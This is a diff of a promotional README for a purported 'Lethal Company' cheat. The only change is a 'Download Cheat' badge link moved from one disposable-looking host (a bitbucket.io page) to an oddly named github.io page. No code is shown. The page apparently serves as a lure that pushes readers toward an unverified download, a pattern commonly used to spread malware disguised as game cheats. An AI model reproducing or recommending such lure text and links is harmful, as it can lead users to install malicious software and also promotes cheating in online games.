@@ -4,7 +4,7 @@
 
 If you're grinding through **Lethal Company** and tired of the same rinse-repeat gameplay, it’s time to level up with a **Lethal Company cheat** that flips the whole game on its head. Whether you're tired of sneaking around in the dark or just wanna rake in loot like a digital billionaire, cheats got your back.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload14.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Lethal-Company-Cheat-Menu-wuj.github.io/.github)
 ---
 
 ## 🎮 What is Lethal Company?
